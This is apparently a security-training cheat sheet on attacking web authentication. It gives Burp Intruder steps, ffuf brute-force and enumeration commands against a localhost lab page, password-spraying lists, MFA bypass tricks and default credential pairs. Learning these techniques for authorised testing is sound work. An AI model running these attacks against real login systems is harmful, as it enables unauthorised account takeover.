# ATTACKING AUTHENTICATION

## Core Concept
Authentication attacks exploit weak or missing controls on login mechanisms.
Main vectors: brute force, username enumeration, MFA bypass, default credentials.

## Brute Force with Burp Suite

1. Intercept login POST request
2. Right-click → **Send to Intruder**
3. Mark password field as payload position: `password=§fuzz§`
4. Payloads tab → load wordlist (e.g. rockyou.txt)
5. Start attack → filter by response length or status code

Example request (captured with Burp):
```
POST /labs/a0x01.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded

username=jeremy&password=fuzz
```

## Brute Force with ffuf

Save the intercepted request to `req.txt`, replace the password value with `FUZZ`:
```
POST /labs/a0x01.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded

username=jeremy&password=FUZZ
```

Run ffuf:
```bash
$ ffuf -request req.txt -request-proto http \
  -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt \
  -fs <size-of-failed-response>
```

`-fs` filters out responses with the given size (= failed logins).

## Username Enumeration

Different error messages reveal valid usernames:
```
"Invalid username"   → username does not exist
"Wrong password"     → username exists!
```

Test with ffuf:
```bash
$ ffuf -request req.txt -request-proto http \
  -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -fs <size-of-failed-response>
```

## Password Spraying

Try one common password against many usernames — avoids account lockout:
```bash
$ ffuf -request req.txt -request-proto http \
  -w usernames.txt \
  -fs <size-of-failed-response>
```

Common passwords to try: `Password1`, `123456`, `Summer2024!`, `Welcome1`

## MFA Bypass

- **Skip the MFA step**: after first factor, directly access the authenticated endpoint
- **Code reuse**: try a previously used or expired code
- **Response manipulation**: intercept MFA check response, change `false` → `true` or 200/403
- **Brute force OTP**: if no rate-limit, fuzz 4–6 digit codes with Burp Intruder

## Default Credentials

Always try before brute force:
```
admin / admin
admin / password
admin / 1234
root / root
guest / guest
```

## Burp Suite Workflow Summary
1. Intercept login request
2. Send to **Intruder** (Burp) or save as file for **ffuf**
3. Identify failure response (size/status)
4. Run attack, filter failures, review hits
5. If MFA present → test bypass techniques

## Resources
- https://github.com/danielmiessler/SecLists (wordlists)
- https://portswigger.net/web-security/authentication
